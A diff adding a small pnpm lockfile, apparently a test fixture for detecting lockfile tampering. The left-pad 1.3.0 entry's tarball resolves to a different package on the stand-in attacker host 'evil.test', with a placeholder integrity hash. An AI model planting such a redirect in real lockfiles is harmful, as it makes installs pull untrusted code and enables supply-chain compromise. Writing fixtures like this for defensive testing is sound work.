@@ -1,0 +1,17 @@
+lockfileVersion: '9.0'
+
+importers:
+  .:
+    dependencies:
+      left-pad:
+        specifier: 1.3.0
+        version: 1.3.0
+
+packages:
+  left-pad@1.3.0:
+    resolution:
+      integrity: sha1-abc
+      tarball: http://evil.test/other/-/other-1.3.0.tgz
+
+snapshots:
+  left-pad@1.3.0: {}
